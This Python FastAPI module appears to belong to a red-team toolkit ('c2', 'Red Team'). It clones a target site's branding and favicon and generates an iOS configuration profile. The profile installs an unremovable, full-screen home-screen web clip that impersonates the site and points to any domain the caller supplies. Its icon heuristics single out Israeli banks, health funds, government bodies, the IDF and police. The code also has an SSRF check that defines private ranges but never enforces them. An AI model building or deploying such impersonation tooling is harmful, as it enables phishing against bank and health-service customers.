import base64
import ipaddress
import re
import uuid
from urllib.parse import urlparse

import httpx
from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel

from backend.auth import get_current_user

router = APIRouter()

# ── SSRF guard ───────────────────────────────────────────────────────────────

_PRIVATE_NETS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fc00::/7"),
]

def _ssrf_check(url: str) -> str:
    """Reject non-HTTPS, IPs, localhost, and private ranges. Returns clean URL."""
    parsed = urlparse(url)
    if parsed.scheme != "https":
        raise HTTPException(400, "Only HTTPS URLs are allowed")
    host = parsed.hostname or ""
    if not host:
        raise HTTPException(400, "Could not parse hostname")
    # Reject raw IP literals
    try:
        addr = ipaddress.ip_address(host)
        raise HTTPException(400, "IP addresses are not allowed as targets")
    except ValueError:
        pass  # it's a hostname, which is fine
    # Reject localhost names
    if host.lower() in ("localhost", "localhost.localdomain") or host.endswith(".local"):
        raise HTTPException(400, "Local hostnames are not allowed")
    return url


# ── Favicon / color helpers ──────────────────────────────────────────────────

def _guess_favicon_emoji(domain: str) -> str:
    d = domain.lower()
    if any(k in d for k in ("bank", "bankhapoalim", "leumi", "discount", "mizrahi", "fibi", "poalim")):
        return "🏦"
    if any(k in d for k in ("health", "clalit", "maccabi", "meuchedet", "kupat", "hospital", "clinic", "med")):
        return "🏥"
    if any(k in d for k in ("gov", "government", "idf", "police", "mof", "state")):
        return "🏛"
    return "🌐"


def _favicon_to_b64(content: bytes, content_type: str) -> str:
    b64 = base64.b64encode(content).decode()
    if "svg" in content_type:
        mime = "image/svg+xml"
    elif "png" in content_type:
        mime = "image/png"
    elif "webp" in content_type:
        mime = "image/webp"
    elif "gif" in content_type:
        mime = "image/gif"
    else:
        mime = "image/x-icon"
    return f"data:{mime};base64,{b64}"


async def _fetch_favicon_b64(base_url: str, favicon_href: str | None, domain: str) -> str:
    """Try to download favicon; fall back to emoji data URI on any error."""
    candidates: list[str] = []
    if favicon_href:
        if favicon_href.startswith("http"):
            candidates.append(favicon_href)
        elif favicon_href.startswith("//"):
            candidates.append("https:" + favicon_href)
        elif favicon_href.startswith("/"):
            parsed = urlparse(base_url)
            candidates.append(f"{parsed.scheme}://{parsed.netloc}{favicon_href}")
        else:
            candidates.append(base_url.rstrip("/") + "/" + favicon_href)

    # Always try /favicon.ico as fallback candidate
    parsed = urlparse(base_url)
    candidates.append(f"{parsed.scheme}://{parsed.netloc}/favicon.ico")

    async with httpx.AsyncClient(timeout=5, follow_redirects=True) as client:
        for url in candidates:
            try:
                r = await client.get(url, headers={"User-Agent": "Mozilla/5.0"})
                if r.status_code == 200 and len(r.content) > 64:
                    ct = r.headers.get("content-type", "image/x-icon")
                    return _favicon_to_b64(r.content, ct)
            except Exception:
                continue

    # Fallback: emoji as SVG data URI
    emoji = _guess_favicon_emoji(domain)
    svg = f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><text y="52" font-size="52">{emoji}</text></svg>'
    b64 = base64.b64encode(svg.encode()).decode()
    return f"data:image/svg+xml;base64,{b64}"


# ── HTML extraction helpers ───────────────────────────────────────────────────

def _find_meta(html: str, *names: str) -> str:
    """Extract content from <meta name=... content=...> or <meta property=... content=...>."""
    for name in names:
        pat = re.compile(
            rf'<meta[^>]+(?:name|property)=["\']?{re.escape(name)}["\']?[^>]+content=["\']([^"\']+)["\']',
            re.IGNORECASE,
        )
        m = pat.search(html)
        if m:
            return m.group(1).strip()
        # Also try reversed attribute order
        pat2 = re.compile(
            rf'<meta[^>]+content=["\']([^"\']+)["\'][^>]+(?:name|property)=["\']?{re.escape(name)}["\']?',
            re.IGNORECASE,
        )
        m2 = pat2.search(html)
        if m2:
            return m2.group(1).strip()
    return ""


def _find_title(html: str) -> str:
    m = re.search(r"<title[^>]*>([^<]{1,200})</title>", html, re.IGNORECASE)
    return m.group(1).strip() if m else ""


def _find_favicon_href(html: str) -> str | None:
    """Find first suitable favicon link element."""
    # Prefer apple-touch-icon, then shortcut icon, then icon
    for rel in ("apple-touch-icon", "shortcut icon", "icon"):
        pat = re.compile(
            rf'<link[^>]+rel=["\']?{re.escape(rel)}["\']?[^>]+href=["\']([^"\']+)["\']',
            re.IGNORECASE,
        )
        m = pat.search(html)
        if m:
            return m.group(1).strip()
        pat2 = re.compile(
            rf'<link[^>]+href=["\']([^"\']+)["\'][^>]+rel=["\']?{re.escape(rel)}["\']?',
            re.IGNORECASE,
        )
        m2 = pat2.search(html)
        if m2:
            return m2.group(1).strip()
    return None


# ── Plist generation ──────────────────────────────────────────────────────────

def _make_mobileconfig(title: str, favicon_b64: str, theme_color: str,
                       app_name: str, subtitle: str, domain: str) -> str:
    clip_uuid = str(uuid.uuid4()).upper()
    profile_uuid = str(uuid.uuid4()).upper()
    clip_id = f"com.webclip.c2.clip.{clip_uuid.lower()}"
    profile_id = f"com.webclip.c2.profile.{profile_uuid.lower()}"
    webclip_url = f"https://{domain}/"

    # Embed favicon as <data> if it's a base64 data URI
    icon_xml = ""
    if favicon_b64.startswith("data:") and ";base64," in favicon_b64:
        raw_b64 = favicon_b64.split(";base64,", 1)[1]
        icon_xml = f"""      <key>Icon</key>
      <data>{raw_b64}</data>
"""

    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>PayloadContent</key>
  <array>
    <dict>
      <key>FullScreen</key>
      <true/>
{icon_xml}      <key>IsRemovable</key>
      <false/>
      <key>Label</key>
      <string>{app_name}</string>
      <key>PayloadDescription</key>
      <string>{subtitle}</string>
      <key>PayloadDisplayName</key>
      <string>{app_name}</string>
      <key>PayloadIdentifier</key>
      <string>{clip_id}</string>
      <key>PayloadType</key>
      <string>com.apple.webClip.managed</string>
      <key>PayloadUUID</key>
      <string>{clip_uuid}</string>
      <key>PayloadVersion</key>
      <integer>1</integer>
      <key>Precomposed</key>
      <true/>
      <key>URL</key>
      <string>{webclip_url}</string>
    </dict>
  </array>
  <key>PayloadDescription</key>
  <string>Installs WebClip shortcut on home screen</string>
  <key>PayloadDisplayName</key>
  <string>{app_name}</string>
  <key>PayloadIdentifier</key>
  <string>{profile_id}</string>
  <key>PayloadOrganization</key>
  <string>Red Team</string>
  <key>PayloadRemovalDisallowed</key>
  <false/>
  <key>PayloadType</key>
  <string>Configuration</string>
  <key>PayloadUUID</key>
  <string>{profile_uuid}</string>
  <key>PayloadVersion</key>
  <integer>1</integer>
</dict>
</plist>"""


# ── Request models ────────────────────────────────────────────────────────────

class FetchIn(BaseModel):
    target_url: str

class GenerateIn(BaseModel):
    title: str
    favicon_b64: str
    theme_color: str
    app_name: str
    subtitle: str
    domain: str


# ── Endpoints ─────────────────────────────────────────────────────────────────

@router.post("/cloner/fetch")
async def cloner_fetch(payload: FetchIn, _user=Depends(get_current_user)):
    url = _ssrf_check(payload.target_url.strip())
    domain = urlparse(url).hostname or ""

    try:
        async with httpx.AsyncClient(timeout=8, follow_redirects=True, max_redirects=5) as client:
            r = await client.get(url, headers={
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
                              "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
            })
    except httpx.TimeoutException:
        raise HTTPException(504, "Target URL timed out")
    except Exception as e:
        raise HTTPException(502, f"Failed to fetch URL: {e}")

    # Reject redirects to non-HTTPS or IPs in the final URL
    final_url = str(r.url)
    _ssrf_check(final_url)

    html = r.text

    title = _find_title(html) or domain
    description = (
        _find_meta(html, "description", "og:description", "twitter:description")
        or f"App from {domain}"
    )
    og_image = _find_meta(html, "og:image", "twitter:image")
    theme_color = _find_meta(html, "theme-color", "msapplication-TileColor") or "#0a84ff"
    favicon_href = _find_favicon_href(html)

    favicon_b64 = await _fetch_favicon_b64(final_url, favicon_href, domain)

    return {
        "ok": True,
        "title": title,
        "description": description,
        "favicon_b64": favicon_b64,
        "og_image_url": og_image,
        "theme_color": theme_color,
        "domain": domain,
    }


@router.post("/cloner/generate")
async def cloner_generate(payload: GenerateIn, _user=Depends(get_current_user)):
    domain = payload.domain.strip().lstrip("https://").lstrip("http://").split("/")[0]
    if not domain:
        raise HTTPException(400, "domain is required")

    plist = _make_mobileconfig(
        title=payload.title,
        favicon_b64=payload.favicon_b64,
        theme_color=payload.theme_color,
        app_name=payload.app_name,
        subtitle=payload.subtitle,
        domain=domain,
    )
    filename = f"webclip-{domain}.mobileconfig"
    return {"ok": True, "mobileconfig": plist, "filename": filename}
